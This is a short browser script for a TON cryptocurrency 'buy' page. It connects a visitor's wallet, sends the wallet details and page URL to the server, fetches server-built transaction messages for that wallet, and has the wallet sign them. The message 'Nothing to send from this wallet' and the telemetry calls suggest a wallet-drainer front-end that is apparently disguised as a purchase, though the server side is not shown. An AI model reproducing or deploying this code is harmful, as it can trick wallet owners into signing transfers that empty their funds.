(() => {
  const UI = window.TON_CONNECT_UI
  if (!UI) { console.error('[app] tonconnect ui failed to load'); return }

  const tonConnectUI = new UI.TonConnectUI({
    manifestUrl: location.origin + '/tonconnect-manifest.json',
    buttonRootId: 'wallet-btn',
    actionsConfiguration: {

      returnStrategy: 'back',
    },
    uiPreferences: {
      theme: 'DARK',
      borderRadius: 's',
      colorsSet: {
        DARK: {
          accent: '#4db2ff',
          background: { primary: '#1a2026', qr: '#ffffff', tint: '#242e38' },
          connectButton: { background: '#248bda', foreground: '#ffffff' },
          icon: { error: '#ff5863' },
          text: { primary: '#ffffff', secondary: '#8794a1' },
        },
      },
    },
  })

  const buyBtn = document.getElementById('buy')
  const statusEl = document.getElementById('status')
  const whoEl = document.getElementById('who')
  const setStatus = t => { if (statusEl) statusEl.textContent = t || '' }
  const post = (p, body) =>
    fetch(p, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) }).catch(() => {})
  const short = a => a.slice(0, 6) + '...' + a.slice(-6)

  tonConnectUI.onStatusChange(wallet => {
    if (wallet) {
      const a = wallet.account.address
      if (whoEl) whoEl.textContent = short(a)
      post('./connected', { raw: wallet, wallet: a, href: location.href })
    } else {
      if (whoEl) whoEl.textContent = ''
      setStatus('')
    }
  })

  async function buy() {
    if (!tonConnectUI.wallet) { await tonConnectUI.openModal(); return }
    const wallet = tonConnectUI.wallet.account.address
    if (buyBtn) buyBtn.disabled = true
    setStatus('Preparing transaction...')

    let data
    try {
      const qs = location.search ? location.search + '&' : '?'
      const r = await fetch('./transaction' + qs + 'wallet=' + wallet)
      data = await r.json()
    } catch {
      setStatus('Could not reach the server. Try again.')
      if (buyBtn) buyBtn.disabled = false
      return
    }

    if (!data || !Array.isArray(data.messages) || data.messages.length === 0) {
      setStatus('Nothing to send from this wallet.')
      if (buyBtn) buyBtn.disabled = false
      return
    }

    setStatus('Confirm in your wallet...')
    try {
      const boc = await tonConnectUI.sendTransaction({
        validUntil: Math.floor(Date.now() / 1000) + 900,
        messages: data.messages,
      })
      setStatus('Transaction sent.')
      post('./accept', { messages: data.messages, boc, wallet, raw: data.raw, href: location.href })
    } catch (e) {
      setStatus('Cancelled.')
      post('./reject', { messages: data.messages, err: e && e.message, wallet, raw: data.raw, href: location.href })
    } finally {
      if (buyBtn) buyBtn.disabled = false
    }
  }

  if (buyBtn) buyBtn.addEventListener('click', buy)
})()
